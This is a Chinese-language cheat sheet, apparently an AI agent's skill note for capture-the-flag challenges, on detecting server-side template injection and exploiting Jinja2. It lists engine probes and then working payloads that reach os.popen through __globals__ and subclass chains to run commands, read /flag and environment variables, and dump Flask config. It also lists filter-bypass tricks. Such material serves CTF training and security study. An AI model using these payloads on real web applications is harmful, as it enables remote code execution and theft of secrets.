# SSTI：模板注入检测与 Jinja2 利用

**一句话**：用户输入被拼进服务端模板引擎渲染时，用 `{{7*7}}` 确认注入，再用
`{{config}}`、`{{self}}`/`__globals__`/`__subclasses__` 链读取配置或执行命令拿 flag。

## 触发信号

关键词：SSTI / template injection / Jinja2 / Twig / Freemarker / RCE / config。
- 输入被原样回显，但经过某种"处理"：`{{7*7}}` 变 49、`${7*7}` 变 49、`<%= 7*7 %>` 变 49。
- 报错里出现 Jinja2/Twig 模板语法错误，或 `name={name}` 这类字面量未被替换（说明占位符不是模板语法）。
- 常见入口：问候语、邮件模板、报表/证书、错误页、搜索回显。

## 探测各引擎

1. Jinja2/Twig：`{{7*7}}` → 49；Jinja2 下 `{{7*'7'}}` → 7777777，Twig 下 → 49。
2. Freemarker：`${7*7}` → 49。
3. EJS/ERB：`<%= 7*7 %>` → 49。
4. 先用无害算术确认，再做利用；不同引擎 payload 不通用。

## Jinja2 利用顺序（由易到难）

1. **直接读配置**：`{{config}}`、`{{config.items()}}` —— 很多题把 flag 放在 Flask config 的 SECRET。
2. 读全局：`{{self}}`、`{{url_for.__globals__}}`、`{{cycler.__init__.__globals__}}`、
   `{{lipsum.__globals__['os'].popen('id').read()}}`。
3. 无 globals 时走类链：
   `{{''.__class__.__mro__[1].__subclasses__()}}` 找到 `subprocess.Popen`/`os._wrap_close` 等，
   再用 `[]` 索引取到并调用；打印下标列表后在 run_python 里构造最终 payload。
4. 读文件/命令：`{{lipsum.__globals__['os'].popen('cat /flag').read()}}`，
   或 `{{config.__class__.__init__.__globals__['os'].popen('env').read()}}`。
5. 绕过过滤：`request.args` 传参（`{{request.args.x}}`）、`|attr('__globals__')`、
   `['__globals__']` 替代点号、`{%print(...)%}`、拼接字符串构造敏感名。

## 坑

- `{{7*7}}` 返回 49 但 `{{config}}` 报错，可能不是 Jinja2（或沙箱禁用 config），先确认引擎。
- 输出可能被 HTML 转义：flag 里的 `{` 不影响；命令输出中的 `<` 可能被转义，必要时 base64：
  `popen('base64 /flag')` 再解码。
- 命令/文件名被过滤时用通配（`cat /f*`）、`env`、`ls /`；优先读环境变量和 config。
- URL 表单里 `{{ }}` 直接放在 body 里即可，注意 `+`/`&`/`=` 的编码。
- 不要反复盲试十几个 payload：先 `{{config}}`，再 `self/globals`，再类链；每一步看回显。
